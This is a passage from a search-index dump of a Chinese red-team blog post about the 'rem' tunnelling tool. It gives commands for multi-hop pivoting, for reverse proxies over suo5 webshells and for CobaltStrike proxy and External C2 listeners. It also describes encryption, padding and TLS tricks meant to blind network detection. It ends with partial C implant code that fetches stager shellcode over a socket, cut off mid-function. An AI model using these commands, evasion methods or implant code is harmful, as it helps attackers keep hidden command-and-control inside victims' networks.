SecurityDescriptor: \"D:P(A;;GA;;;WD)\", // WD \u8868\u793a Everyone\uff0c\u5141\u8bb8\u6240\u6709\u4eba\u8bbf\u95ee  \n       MessageMode:        true,              // \u6d88\u606f\u6a21\u5f0f  \n       InputBufferSize:    65536,             // \u9ed8\u8ba4\u7f13\u51b2\u533a\u5927  \n       OutputBufferSize:   65536,  \n    }  \n\n    listener, err := winio.ListenPipe(pipePath, config)  \n    if err != nil {  \n       return nil, err  \n    }  \n    utils.Log.Debugf(\"listen pipe: %s\", pipePath)  \n    c.listener = listener  \n    return listener, nil  \n}\n</code></pre> <p>\u5b9e\u9645\u4e0a\u8fd9\u4e9b\u4ee3\u7801\u5927\u591a\u90fd\u662fai\u751f\u6210\u7684\uff0c\u6211\u53ea\u8fdb\u884c\u4e86\u8f93\u51fa\u8f93\u51fa\u7684\u7edf\u4e00\u98ce\u683c\u3002</p>"},{"location":"blog/todo/%E6%94%BB%E9%98%B2%E5%9C%BA%E6%99%AF%E4%B8%AD%E7%9A%84%E7%BD%91%E7%BB%9C%E4%BE%A7%E5%AF%B9%E6%8A%97%E9%9D%A9%E5%91%BD%20%28%E4%B8%8B%29---rem/#\u5176\u4ed6\u4fe1\u9053","title":"\u5176\u4ed6\u4fe1\u9053","text":"<p>\u975e\u5e38\u6709\u7528\u7684\u4fe1\u9053\u8fd8\u6709\u4f8b\u5982wireguard, tor,  dns(doh), unix socket, SMB \u7b49\u7b49. \u6709\u4e00\u4e9b\u5728rem-community \u4e2d\u5df2\u7ecf\u5b9e\u73b0\uff0c\u5176\u4ed6\u7684\u5b9e\u73b0\u4e5f\u4e0d\u56f0\u96be\u3002\u8fd9\u4e9b\u4fe1\u9053\u5728\u4e0d\u540c\u7684\u9886\u57df\u6709\u4e0d\u540c\u7684\u7528\u9014\u3002</p> <p>\u5728\u8fd9\u91cc\u53ef\u4ee5\u770b\u5230rem\u5df2\u7ecf\u652f\u6301\u7684\u6240\u6709\u4fe1\u9053: https://github.com/chainreactors/rem-community/tree/master/protocol/tunnel</p> <p>\u5728github \u81ea\u52a8\u7f16\u8bd1\u7684release\u4e2d\u53ea\u4f7f\u7528\u4e86tcp/udp\u4e24\u4e2a\u6700\u5e38\u7528\u7684\u4fe1\u9053\u3002\u5982\u679c\u6709\u66f4\u591a\u7684\u4fe1\u9053\u9700\u6c42, \u53ef\u4ee5\u901a\u8fc7rem\u81ea\u5e26\u7684\u6761\u4ef6\u7f16\u8bd1\u5de5\u5177 https://github.com/chainreactors/rem-community/blob/master/build.sh \u5b9e\u73b0\u3002</p> <pre><code>sh ./build.sh -o \"windows/amd64\" -t \"unix\"\n</code></pre>"},{"location":"blog/todo/%E6%94%BB%E9%98%B2%E5%9C%BA%E6%99%AF%E4%B8%AD%E7%9A%84%E7%BD%91%E7%BB%9C%E4%BE%A7%E5%AF%B9%E6%8A%97%E9%9D%A9%E5%91%BD%20%28%E4%B8%8B%29---rem/#\u7ea7\u8054","title":"\u7ea7\u8054","text":"<p>\u5bf9\u4e8e\u653b\u9632\u573a\u666f\u4e2d, \u96be\u514d\u6709\u5927\u91cf\u9700\u8981\u8de8\u8fc7\u591a\u5c42\u7f51\u7edc\u7684\u573a\u666f\uff0c\u4e5f\u5c31\u662f\u5e38\u8bf4\u7684\u7ea7\u8054\u3002</p> <p>\u5728\u53e4\u65e9\u65f6\u671f\uff0c \u5e38\u901a\u8fc7\u4f20\u9012\u5f0f\u7684\u7aef\u53e3\u8f6c\u53d1\uff0c \u4f8b\u5982\u4f7f\u7528lcx,ew\u4e4b\u7c7b\u7684\u5de5\u5177\u5c06\u4ee3\u7406\u4ece\u5c42\u5c42\u5185\u7f51\u4e2d\u8f6c\u53d1\u5230\u5916\u90e8\u3002 </p> <p>\u4e00\u4e9b\u7684\u73b0\u4ee3\u7684\u5de5\u5177\u7684\u5b9e\u73b0\u65b9\u5f0f\u6709\u70b9\u50cfC2\uff0c \u4f8b\u5982 Stowaway, venom\u5219\u4f1a\u76d1\u542c\u4e00\u4e2a\u7aef\u53e3\uff0c \u901a\u8fc7\u53cd\u8fde\u7684\u65b9\u5f0f\u5728\u5185\u5b58\u4e2d\u8fdb\u884csocks5\u7684\u4ea4\u4e92\uff0c \u800c\u4e0d\u662f\u76f4\u63a5\u76d1\u542c\u4e00\u4e2asocks5\u7aef\u53e3\u3002\u672c\u8d28\u4e0a\u662f\u57fa\u4e8e\u591a\u8def\u590d\u7528\u534f\u8bae(smux, ymux\u7b49)\u5728\u5185\u5b58\u4e2d\u5c06\u4e00\u4e2a\u8fde\u63a5\u590d\u7528\u4e3a\u591a\u4e2a\u4e0d\u540c\u5e94\u7528\u7684\u8fde\u63a5\u3002 </p> <p>rem\u7684\u5b9e\u73b0\u4e5f\u662f\u7c7b\u4f3c, \u53ea\u4e0d\u8fc7\u4e3a\u4e86\u53bb\u6389\u591a\u8def\u590d\u7528\u534f\u8bae\u7684\u7279\u5f81(\u9759\u6001\u7279\u5f81\u548c\u7edf\u8ba1\u5b66\u7279\u5f81), rem\u81ea\u884c\u5b9e\u73b0\u4e00\u4e2a\u7b80\u5355\u7684\u591a\u8def\u590d\u7528\u3002 </p> <p>\u793a\u4f8b\uff1a \u5047\u8bbeA(\u5916\u90e8\u670d\u52a1\u5668) -- B (\u5185\u7f51\u8fb9\u754c) -- C(\u5185\u7f51\u6838\u5fc3)</p> <pre><code># A \n# \u76d1\u542crem cnosole\n\n./rem -a A\n</code></pre> <pre><code># B\n# \u76d1\u542c\u670d\u52a1, \u5e76\u8fde\u63a5\u5230A\n\n./rem -c 'tcp://' -c '[A rem_link]' -a B\n</code></pre> <pre><code># C\n# \u901a\u8fc7B\u8fde\u63a5\u5230A\n\n./rem -c '[B rem_link]' -d A\n</code></pre> <p>-a \u4e0e -d\u53c2\u6570</p> <p>-a\u53c2\u6570\u8868\u793a\u5f53\u524d\u8282\u70b9\u522b\u540d\uff0c\u4e3a\u7a7a\u5219\u968f\u673a\u751f\u6210 -d\u8868\u793a\u76ee\u7684\u8282\u70b9\u540d\u79f0\uff0c \u4e3a\u7a7a\u5219\u8868\u793arem_link\u6307\u5411\u7684\u8282\u70b9</p> <p>\u800c\u5728\u5b9e\u6218\u573a\u666f\u4e2d\uff0c \u8fd8\u6709\u4e00\u5927\u7c7b\u7684\u7ea7\u8054\u9700\u6c42\u3002 </p> <p>\u5728\u73b0\u4ee3\u7f51\u7edc\u73af\u5883\u4e2d\uff0c\u7ecf\u5e38\u4f1a\u9047\u5230\u4e0d\u51fa\u7f51\u7684\u5185\u7f51\u3002 \u5927\u90e8\u5206\u7684\u89e3\u51b3\u601d\u8def\u90fd\u662f\u901a\u8fc7icmp, dns\u7b49\u4fe1\u9053\u5b9e\u73b0\u51fa\u7f51\u3002 \u4f46\u9700\u8981\u4ed4\u7ec6\u601d\u8003\u4e00\u4e0b\uff0c \u590d\u6742\u4e1a\u52a1\u771f\u7684\u80fd\u79bb\u5f00\u4e92\u8054\u7f51\u72ec\u7acb\u8fd0\u884c\u4e48\uff1f </p> <p>\u5b9e\u9645\u4e0a\u5927\u591a\u6570\u573a\u666f\u90fd\u662f\u901a\u8fc7\u5185\u7f51\u4ee3\u7406\uff08socks5/http\uff09\u7b49\u5b9e\u73b0\u51fa\u7f51\uff0c \u8ba9\u4e1a\u52a1\u80fd\u591f\u8bbf\u95ee\u5230\u5916\u90e8\u5e94\u7528\u3002 </p> <p>\u8fd9\u91cc\u7684\u573a\u666f\u53ef\u4ee5\u7ec6\u5206\u4e3a\uff1a</p> <ol> <li>\u5185\u7f51\u4ee3\u7406\u6709\u9a8c\u8bc1\uff0c \u4f8b\u5982\u6253\u5f00\u4e86socks5\u548chttp\u7684auth</li> <li>\u5185\u7f51\u4ee3\u7406\u5165\u65b9\u5411IP\u767d\u540d\u5355\uff0c\u9700\u8981\u901a\u8fc7\u6a2a\u5411\u5230\u6307\u5b9a\u767d\u540d\u5355\u642d\u5efarem</li> <li>\u5185\u7f51\u4ee3\u7406\u51fa\u65b9\u5411IP\u767d\u540d\u5355\uff0c\u5927\u90e8\u5206\u57fa\u4e8eSNI\u6216\u8005Host\u5b9e\u73b0\u6821\u9a8c\uff0c\u53ef\u4ee5\u901a\u8fc7\u57df\u524d\u7f6erem\u6216\u8005SNI\u4f2a\u9020\u642d\u5efarem</li> </ol> <p>\u53ea\u9700\u8981\u8ba9\u5de5\u5177\u652f\u6301socks5,http\u7b49\u534f\u8bae\u5373\u53ef\u5b9e\u73b0\u7ea7\u8054\u3002 </p> <p>\u4e0d\u8fc7\u73b0\u5728\u8fd8\u6709\u4e00\u79cd\u89e3\u51b3\u65b9\u6848\uff0c\u5728\u524d\u6bb5\u65f6\u95f4\u53d1\u4e86\u4e00\u7bc7\u5173\u4e8egolang proxyclient\u7684\u6587\u7ae0</p> <p>\u62d3\u5c55golang\u4ee3\u7406\u7684\u8fb9\u754c proxyclient</p> <p>\u91cc\u9762\u5b9e\u73b0\u4e86neoreg\u4e0esuo5\u7684proxy client</p> <p>\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7neoreg/suo5 \u4fe1\u9053\u642d\u5efarem\uff0c \u5b9e\u73b0\u7c7b\u4f3c https://github.com/FunnyWolf/pystinger \u7684\u529f\u80fd\u3002\u53ef\u4ee5\u5c06\u5916\u90e8\u7684C2\u7aef\u53e3\u8f6c\u53d1\u5230\u5185\u7f51\uff0c \u6216\u8005\u642d\u5efareverse proxy\u7b49\u7b49\u5404\u79cd\u7528\u9014\u3002</p> <p>\u751a\u81f3\u6b64\u4e3e\u8fd8\u80fd\u63d0\u9ad8neoreg/suo5\u7684\u6027\u80fd\uff0c \u56e0\u4e3arem\u5b9e\u73b0\u4e86\u591a\u8def\u590d\u7528\uff0c\u800cgolang\u7684\u7f51\u7edc\u6027\u80fd\u8fdc\u8fdc\u5f3a\u4e8e\u57fa\u4e8ewebshell\u5b9e\u73b0\u7684server\uff0cwebshell\u4fa7\u53ea\u9700\u8981\u7ef4\u62a4\u4e00\u6761\u4fe1\u9053\uff0c\u53ef\u4ee5\u6700\u5927\u7a0b\u5ea6\u5229\u7528\u5e26\u5bbd\u3002 </p> <p>\u793a\u4f8b\uff1a \u5047\u8bbeA(\u5916\u90e8\u670d\u52a1\u5668) -- B (\u5185\u7f51\u8fb9\u754c)</p> <pre><code># B\n# \u642d\u5efarem console\n\n./rem \n</code></pre> <pre><code># A\n# \u901a\u8fc7webshell\u642d\u5efarem \u4f20\u8f93\u5c42, \u642d\u5efa\u53cd\u5411\u4ee3\u7406\n\n./rem -c [B rem_link] --forward suo5://webshell_url/ -m proxy -l socks5://\n</code></pre>"},{"location":"blog/todo/%E6%94%BB%E9%98%B2%E5%9C%BA%E6%99%AF%E4%B8%AD%E7%9A%84%E7%BD%91%E7%BB%9C%E4%BE%A7%E5%AF%B9%E6%8A%97%E9%9D%A9%E5%91%BD%20%28%E4%B8%8B%29---rem/#lolc2","title":"lolC2","text":"<p>https://lolc2.github.io/  \u662f\u4e00\u4e2a\u77e5\u540d\u7684\u57fa\u4e8e\u5408\u6cd5\u670d\u52a1\u6784\u5efaC2\u4fe1\u9053\u7684\u5408\u96c6\u7f51\u7ad9\u3002 \u5927\u81f4\u539f\u7406\u662f\u901a\u8fc7\u4e00\u4e9b\u539f\u6709\u7684\u529f\u80fd\u5b9e\u73b0\u6570\u636e\u4ea4\u6362\uff0c \u53ef\u80fd\u662f\u8bc4\u8bba\u3001\u90ae\u4ef6\u3001\u5e16\u5b50\u3001\u64ad\u653e\u5217\u8868\u7b49\u7b49\u65b9\u5f0f\u5b9e\u73b0\u3002 \u7406\u8bba\u4e0a\u5b58\u5728\u6570\u636e\u4ea4\u6362\u5c31\u53ef\u4ee5\u4f5c\u4e3aC2\u4fe1\u9053\u3002 </p> <p>\u5bf9\u4e8e\u4e00\u822cC2\u6765\u8bf4\uff0c \u57fa\u4e8elolc2\u5b9e\u73b0\u4e00\u4e2a\u4fe1\u9053\u5e76\u4e0d\u56f0\u96be\u3002 \u4f46\u662f\u8bf7\u6ce8\u610f\uff0c rem\u662f\u6784\u5efa\u4e86\u4e00\u4e2a\u865a\u62df\u4f20\u8f93\u5c42\uff0c \u5728\u8fd9\u4e2a\u4f20\u8f93\u5c42\u4e0a\u6784\u5efa\u4e86\u5404\u79cd\u5404\u6837\u7684\u5e94\u7528\uff08\u5728\u4e0a\u4e00\u7bc7\u6587\u7ae0\u4e2d\u63d0\u5230\u8fc7\u5982\u4f55\u4f7f\u7528ARQ\u534f\u8bae\u5c06\u4e0d\u53ef\u9760\u7684\u4fe1\u9053\u53d8\u4e3a\u53ef\u9760\u7684\u4fe1\u9053\uff09\u3002</p> <p>\u5982\u679c\u51fa\u4e8e\u6027\u80fd\u8003\u8651\uff0c\u4f18\u5148\u5bfb\u627e\u80fd\u591f\u6d41\u5f0f\u4f20\u8f93\u7684\u63a5\u53e3\u3002 \u5f53\u7136\u5982\u679c\u6ca1\u6709\u8fd9\u6837\u7684\u63a5\u53e3\uff0c \u4e5f\u53ef\u4ee5\u4f7f\u7528HTTP\u534f\u8bae\u5b9e\u73b0\uff0c \u901a\u8fc7\u5355\u5de5\u4fe1\u9053\u6a21\u62df\u53cc\u5de5\uff0c\u5c31\u50cf\u662fneoreg\u505a\u7684\u4e00\u6837\u3002 </p> <p>\u53ef\u4ee5\u53c2\u8003\u4e0b\u9762\u4ee3\u7801\uff0c\u5c01\u88c5\u4e86\u4e00\u7ec4\u63a5\u53e3\uff0c\u53ef\u4ee5\u5c06\u4f8b\u5982HTTP\u534f\u8bae\u7684\u5355\u5de5\u4fe1\u9053\u6a21\u62df\u6210\u53cc\u5de5\u4fe1\u9053\uff08\u5b9e\u9645\u4e0a\u8fd8\u662f\u5355\u5de5\uff09\uff1a</p> <p>\u5355\u5de5\u4fe1\u9053\u6a21\u62df\u53cc\u5de5\u901a\u4fe1: https://github.com/chainreactors/rem-community/blob/master/x/kcp/simplex.go</p> <p>\u57fa\u4e8ehttp\u534f\u8bae\u7684\u5177\u4f53\u5b9e\u73b0\uff0c \u5c06http\u534f\u8bae\u6a21\u62df\u4e3a\u53cc\u5de5\u901a\u8baf https://github.com/chainreactors/rem-community/blob/master/x/kcp/http.go</p> <p>\u5047\u8bbe\u6709\u4e00\u4e2a\u53ef\u4fe1\u670d\u52a1\u80fd\u4ea4\u6362\u6570\u636e\uff0c\u53ea\u9700\u8981\u6839\u636ehttp\u534f\u8bae\u8fdb\u884c\u7b80\u5355\u7684\u4fee\u6539\uff0c \u5373\u53ef\u6784\u5efa\u4e00\u4e2a\u57fa\u4e8e\u8be5\u670d\u52a1\u7684\u53cc\u5de5\u901a\u8baf\u4fe1\u9053\u3002 </p>"},{"location":"blog/todo/%E6%94%BB%E9%98%B2%E5%9C%BA%E6%99%AF%E4%B8%AD%E7%9A%84%E7%BD%91%E7%BB%9C%E4%BE%A7%E5%AF%B9%E6%8A%97%E9%9D%A9%E5%91%BD%20%28%E4%B8%8B%29---rem/#\u52a0\u5bc6\u6df7\u6dc6","title":"\u52a0\u5bc6\u6df7\u6dc6","text":"<p>\u5bf9\u4e8e\u7f51\u7edc\u4fa7\u5bf9\u6297\u6765\u8bf4\uff0c\u6570\u636e\u5b89\u5168\u4e0d\u4ec5\u4ec5\u662f\u5c06\u6570\u636e\u52a0\u5bc6\uff0c\u8fd8\u6709\u4f2a\u88c5\u4e0e\u6a21\u62df\u3001\u5bc6\u7801\u5b66\u524d\u5411\u4e0e\u540e\u5411\u5b89\u5168\u3001\u9632\u4e3b\u52a8\u63a2\u6d4b\u7b49\u7b49\u7ec6\u5206\u573a\u666f\u3002</p> <p>\u8bf4\u5230\u6d41\u91cf\u52a0\u5bc6\u6df7\u6dc6\uff0c \u653b\u9632\u573a\u666f\u4e2d\u4f7f\u7528\u7684\u6280\u5de7\u5176\u5b9e\u6781\u4e3a\u539f\u59cb\u3002 \u5728\u8fd9\u4e2a\u9886\u57df\u73a9\u51fa\u82b1\u6765\u7684\u8fd8\u662f\u5f97\u662f\u67d0\u4e9b\u4e0d\u53ef\u8bf4\u7684\u5de5\u5177\u3002 \u6709\u4e00\u4e9b\u975e\u5e38\u5f3a\u5927\u7684\u5b9e\u73b0\u53ef\u4ee5\u53c2\u8003\uff0c \u4f8b\u5982\uff1aclash-core, sing-box, Xray-core\u3002 </p> <p>\u8fd9\u4e2a\u90e8\u5206\u4e0d\u4fbf\u4ecb\u7ecd\u7684\u8fc7\u4e8e\u8be6\u7ec6\u3002 \u5728\u957f\u5e74\u7d2f\u6708\u7684\u5bf9\u6297\u4e2d\uff0c\u4ed6\u4eec\u751a\u81f3\u5341\u5e74\u524d\u4f7f\u7528\u7684\u6280\u672f\u90fd\u53ef\u4ee5\u8f7b\u677e\u7ed5\u8fc7\u76ee\u524d\u6240\u6709\u5382\u5546\u7684NDR/\u6001\u52bf\u611f\u77e5\u7b49\u7f51\u7edc\u6d4b\u8bbe\u5907\u3002 </p> <p>\u800c\u6211\u4eec\u8981\u505a\u7684\uff0c\u5c06\u4e00\u4e9b\u6700\u57fa\u7840\u7684\u6280\u5de7\u5728rem\u4e2d\u5b9e\u73b0\uff0c\u5c31\u53ef\u4ee5\u8ba9\u81f4\u76f2\u4efb\u610f\u7f51\u7edc\u4fa7\u7684\u68c0\u6d4b\u3002 </p> <p>rem\u4e2d\u7684wrapper\u5206\u4e3a\u4e24\u7c7b\uff0c \u901a\u8fc7\u662f\u5426\u662f\u52a0\u5bc6\u7528\u9014\u533a\u5206</p>"},{"location":"blog/todo/%E6%94%BB%E9%98%B2%E5%9C%BA%E6%99%AF%E4%B8%AD%E7%9A%84%E7%BD%91%E7%BB%9C%E4%BE%A7%E5%AF%B9%E6%8A%97%E9%9D%A9%E5%91%BD%20%28%E4%B8%8B%29---rem/#\u52a0\u5bc6","title":"\u52a0\u5bc6","text":"<p>\u52a0\u5bc6\u7528\u9014\u7684wrapper\u9700\u8981\u652f\u6301\u6d41\u5f0f\u52a0\u5bc6\u3002 </p> <p>rem\u4e2d\u53ea\u5b9e\u73b0\u4e86\u975e\u5e38\u57fa\u7840\u7684xor\u548cAES-CFB\u52a0\u5bc6\u3002</p> <p>rem\u5728\u9ed8\u8ba4\u542f\u52a8\u65f6\u4f1a\u968f\u673a\u751f\u62102-4\u7ec4\u52a0\u5bc6\u914d\u7f6e\uff0c \u5d4c\u5957\u52a0\u5bc6\u3002 \u4e5f\u5c31\u662frem_link\u4e2d\u957f\u957f\u7684\u90a3\u4e00\u4e32wrapper\u7684\u914d\u7f6e\u3002 </p> <pre><code>func GenerateRandomWrapperOption() *WrapperOption {  \n    name := AvailableWrappers[rand.Intn(len(AvailableWrappers))]  \n\n    opt := &amp;WrapperOption{  \n       Name:    name,  \n       Options: make(map[string]string),  \n    }  \n\n    switch name {  \n    case AESWrapper:  \n       opt.Options[\"key\"] = utils.RandomString(32)  \n       opt.Options[\"iv\"] = utils.RandomString(16)  \n    case XORWrapper:  \n       opt.Options[\"key\"] = utils.RandomString(32)  \n       opt.Options[\"iv\"] = utils.RandomString(16)  \n    }  \n\n    return opt  \n}\n</code></pre> <p>\u5982\u679c\u6709\u66f4\u5f3a\u7684\u5bc6\u7801\u5b66\u5b89\u5168\u9700\u6c42\uff0c \u53ef\u4ee5\u57fa\u4e8epgp/age\u7b49\u5e93\u81ea\u884c\u5b9e\u73b0\u3002</p> <p>\u4e3a\u4e86\u4e0d\u5f15\u8d77\u4e0d\u5fc5\u8981\u7684\u8bef\u4f1a\uff0c rem-community\u4e2d\u53ea\u6dfb\u52a0\u4e86\u6700\u4e3a\u57fa\u7840\u7684\u52a0\u5bc6\u6df7\u6dc6\u65b9\u6848\u3002 </p>"},{"location":"blog/todo/%E6%94%BB%E9%98%B2%E5%9C%BA%E6%99%AF%E4%B8%AD%E7%9A%84%E7%BD%91%E7%BB%9C%E4%BE%A7%E5%AF%B9%E6%8A%97%E9%9D%A9%E5%91%BD%20%28%E4%B8%8B%29---rem/#\u4f2a\u88c5","title":"\u4f2a\u88c5","text":"<p>\u975e\u52a0\u5bc6\u7528\u9014\u7684wrapper\uff0c \u4f8b\u5982padding\u548ccompress\u3002</p> <p>\u524d\u8005\u7528\u6765\u586b\u5145\u6307\u5b9a\u6570\u636e\uff0c\u7528\u6765\u6a21\u62df\u67d0\u4e9b\u534f\u8bae\u7684\u534f\u8bae\u5934\uff0c \u540e\u8005\u662f\u7528\u6765\u5b9e\u73b0\u6570\u636e\u538b\u7f29\u7684\u3002 </p> <p>\u901a\u8fc7\u5404\u79cdwrapper\u7684\u7ec4\u5408\uff0c \u6211\u4eec\u53ef\u4ee5\u81ea\u5b9a\u4e49\u4efb\u610f\u7684\u6d41\u91cf\u7279\u5f81\u3002 wrapper\u4f1a\u6309\u7167\u987a\u5e8f\u4f9d\u6b21\u5904\u7406\u6570\u636e\u3002 </p> <p>\u901a\u8fc7padding \u7ed9\u6570\u636eHTTP\u534f\u8bae\u5934 \u2192 \u5b9e\u73b0\u4e00\u4e2agzip\u7684\u538b\u7f29wrapper </p> <p>\u8fd9\u6837\u5c31\u80fd\u5c06\u6570\u636e\u4f2a\u9020\u6210http\u7684\u4e0a\u4f20\u4e0b\u8f7d\u6d41\u91cf\u3002</p> <p>\u8fd9\u4e2a\u529f\u80fd\u76ee\u524d\u6ca1\u6709\u901a\u8fc7\u547d\u4ee4\u884c\u5bf9\u5916\u5c01\u88c5\uff0c \u5982\u679c\u60f3\u8981\u5b9e\u73b0\u7279\u5b9a\u7684\u6548\u679c\uff0c \u9700\u8981\u7ed3\u5408\u4ee3\u7801\u5b9e\u73b0\u3002 </p>"},{"location":"blog/todo/%E6%94%BB%E9%98%B2%E5%9C%BA%E6%99%AF%E4%B8%AD%E7%9A%84%E7%BD%91%E7%BB%9C%E4%BE%A7%E5%AF%B9%E6%8A%97%E9%9D%A9%E5%91%BD%20%28%E4%B8%8B%29---rem/#tls","title":"TLS","text":"<p>tls\u662f\u67d0\u4e2a\u4e0d\u53ef\u8a00\u8bf4\u7684\u9886\u57df\u4e2d\u73a9\u6cd5\u6700\u591a\u7684\u5b58\u5728\u3002 \u5e38\u89c1\u7684\u73a9\u6cd5\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e:</p> <ul> <li>tlsintls, \u7edf\u8ba1\u5b66\u7279\u5f81\u6d88\u9664</li> <li>uTLS , tls\u7279\u5f81\u6a21\u62df</li> <li>ECH,  Encrypted Client Hello</li> <li>SNI\u4f2a\u9020</li> <li>shadowtls</li> <li>reality</li> </ul> <p>\u5927\u90e8\u5206\u5382\u5546\u7684\u7f51\u7edc\u8bbe\u5907\u5bf9\u4e8efrp\uff0cnps\u4e4b\u7c7b\u7684\u5de5\u5177\u8bc6\u522b\u90fd\u57fa\u4e8etls\u7684\u52a0\u5bc6\u5957\u4ef6\u548c\u9ed8\u8ba4\u7279\u5f81\u5b9e\u73b0\u3002 \u800c\u53ea\u9700\u8981\u5176\u4e2d1-2\u4e2a\u6280\u672f\uff0c \u5c31\u80fd\u5b8c\u5168\u89c4\u907f\u68c0\u6d4b\u3002 </p> <p>\u8fd9\u91cc\u7684\u6280\u672f\u6709\u4e00\u5b9a\u98ce\u9669\uff0c \u6240\u4ee5rem-community\u4e2d\u53ea\u6dfb\u52a0\u4e86\u5df2\u7ecf\u88ab\u62ab\u9732\u4e86\u660e\u663e\u7279\u5f81(\u53ea\u662f\u5bf9\u4e8e\u67d0\u4e2a\u9886\u57df\u6709\u7279\u5f81\uff0c\u5bf9\u4e8e\u7f51\u7edc\u4fa7\u653b\u9632\u5bf9\u6297\u5e76\u6ca1\u6709\u5927\u591a\u7279\u5f81)\u7684tlsintls\u3002 \u5176\u4ed6\u6280\u672f\u53ef\u4ee5\u81ea\u884c\u7814\u7a76\uff0c \u5b9e\u73b0\u8d77\u6765\u5e76\u4e0d\u590d\u6742\u3002 </p>"},{"location":"blog/todo/%E6%94%BB%E9%98%B2%E5%9C%BA%E6%99%AF%E4%B8%AD%E7%9A%84%E7%BD%91%E7%BB%9C%E4%BE%A7%E5%AF%B9%E6%8A%97%E9%9D%A9%E5%91%BD%20%28%E4%B8%8B%29---rem/#cobaltstrike\u8054\u52a8","title":"CobaltStrike\u8054\u52a8","text":""},{"location":"blog/todo/%E6%94%BB%E9%98%B2%E5%9C%BA%E6%99%AF%E4%B8%AD%E7%9A%84%E7%BD%91%E7%BB%9C%E4%BE%A7%E5%AF%B9%E6%8A%97%E9%9D%A9%E5%91%BD%20%28%E4%B8%8B%29---rem/#proxy","title":"Proxy","text":"<p>cobaltstrike\u7684listener\u914d\u7f6e\u4e2d\u63d0\u4f9b\u4e86http-proxy, \u53ef\u4ee5\u901a\u8fc7rem\u642d\u5efa\u4e00\u4e2ahttp_proxy, \u5373\u53ef\u5c06\u6d41\u91cf\u8f6c\u53d1\u5230\u5916\u7f51\u3002 </p> <pre><code>rem -c [rem_link] -m proxy -l http://:8080\n</code></pre> <p>\u7136\u540e\u5728CS\u4e2d\u914d\u7f6elistener\u5373\u53ef</p> <p></p>"},{"location":"blog/todo/%E6%94%BB%E9%98%B2%E5%9C%BA%E6%99%AF%E4%B8%AD%E7%9A%84%E7%BD%91%E7%BB%9C%E4%BE%A7%E5%AF%B9%E6%8A%97%E9%9D%A9%E5%91%BD%20%28%E4%B8%8B%29---rem/#external-c2","title":"External C2","text":"<p>\u8fd8\u6709\u66f4\u9ad8\u7ea7\u7684\u73a9\u6cd5. CS\u5728\u65e9\u51e0\u5e74\u524d\u5c31\u5b9e\u73b0\u4e86\u4e00\u4e2a\u7b80\u6613\u7684\u7b2c\u4e09\u65b9\u4fe1\u9053\u4e0a\u7ebf\u7684\u529f\u80fd externalc2.</p> <p>\u5b98\u65b9\u6587\u6863\u89c1: https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/listener-infrastructure_external-c2.htm</p> <p>\u7b80\u5355\u6765\u8bf4\uff0c \u5206\u4e3a\u4e24\u4e2a\u90e8\u5206\uff0c implant (\u9700\u81ea\u884c\u5b9e\u73b0)\u548c channel (\u57fa\u4e8erem\u5b9e\u73b0)\u3002 implant\u9700\u8981\u5b9e\u73b0shellcode\u6ce8\u5165\u548cpipe\u4ea4\u4e92\u4e24\u4e2a\u529f\u80fd. channel\u8d1f\u8d23\u8f6c\u53d1\u6d41\u91cf\u5230external listener\u3002 </p> <p>\u539f\u7406\u5f88\u7b80\u5355\uff0c implant\u521d\u59cb\u5316\u540e\u4eceCS\u7684server\u83b7\u53d6stager shellcode\uff0c \u6267\u884c\u5bf9\u5e94shellcode\uff0c \u8fd9\u4e2astager\u57fa\u4e8eSMB(pipe)\u901a\u8baf\uff0cimplant\u8d1f\u8d23\u5c06\u8f6c\u53d1 pipe\u4e0echannel\u4e4b\u95f4\u7684\u6570\u636e\u3002</p> <p>\u5728CS\u4e2d\u65b0\u589eexternal C2 listener</p> <p></p> <p>\u7136\u540erem\u6784\u5efa\u5bf9\u5e94\u534f\u8bae\u7684\u5e94\u7528\u5c42\u4e3aCS\uff0c \u53ef\u4ee5\u4efb\u610f\u9009\u62e9\u4f20\u8f93\u5c42 <pre><code>./rem -c [rem_link] -m proxy -l cs://:12345 -r raw://\n</code></pre></p> <p>implant\u9700\u8981\u81ea\u884c\u5b9e\u73b0\uff0c\u6211\u8ba9ai\u751f\u6210\u4e86\u4e00\u6bb5\u7b80\u5355\u7684\u4ee3\u7801</p> <pre><code>\u00a0 \u00a0 WSADATA wsaData;\n\u00a0 \u00a0 if (WSAStartup(MAKEWORD(2, 2), &amp;wsaData) != 0) {\n\u00a0 \u00a0 \u00a0 \u00a0 printf(\"WSAStartup failed: %d\\n\", WSAGetLastError());\n\u00a0 \u00a0 \u00a0 \u00a0 return;\n\u00a0 \u00a0 }\n\n\u00a0 \u00a0 /* \u521b\u5efa socket */\n\u00a0 \u00a0 SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);\n\u00a0 \u00a0 if (sock == INVALID_SOCKET) {\n\u00a0 \u00a0 \u00a0 \u00a0 printf(\"socket failed: %d\\n\", WSAGetLastError());\n\u00a0 \u00a0 \u00a0 \u00a0 WSACleanup();\n\u00a0 \u00a0 \u00a0 \u00a0 return;\n\u00a0 \u00a0 }\n\u00a0 \u00a0 /* \u914d\u7f6e\u670d\u52a1\u5668\u5730\u5740 */\n\n\u00a0 \u00a0 struct sockaddr_in server;\n\u00a0 \u00a0 server.sin_family = AF_INET;\n\u00a0 \u00a0 server.sin_port = htons(26019); // \u6307\u5b9a\u7aef\u53e3\uff0c\u4f8b\u5982 12345\n\u00a0 \u00a0 server.sin_addr.s_addr = inet_addr(\"127.0.0.1\"); // \u6307\u5b9a IP\uff0c\u4f8b\u5982\u672c\u5730 127.0.0.1\n\u00a0 \u00a0 if (connect(sock, (struct sockaddr *)&amp;server, sizeof(server)) == SOCKET_ERROR) {\n\u00a0 \u00a0 \u00a0 \u00a0 printf(\"connect failed: %d\\n\", WSAGetLastError());\n\u00a0 \u00a0 \u00a0 \u00a0 closesocket(sock);\n\u00a0 \u00a0 \u00a0 \u00a0 WSACleanup();\n\u00a0 \u00a0 \u00a0 \u00a0 return;\n\u00a0 \u00a0 }\n\u00a0 \u00a0 \n\u00a0 \u00a0 /* \u4ece socket \u83b7\u53d6 payload */\n\u00a0 \u00a0 char *srvpayload = malloc(PAYLOAD_MAX_SIZE);\n\u00a0 \u00a0 if (!srvpayload) {\n\u00a0 \u00a0 \u00a0 \u00a0 printf(\"malloc failed\\n\");\n\u00a0 \u00a0 \u00a0 \u00a0 closesocket(sock);\n\u00a0 \u00a0 \u00a0 \u00a0 WSACleanup();\n\u00a0 \u00a0 \u00a0 \u00a0 return;\n\u00a0 \u00a0 }\n\u00a0 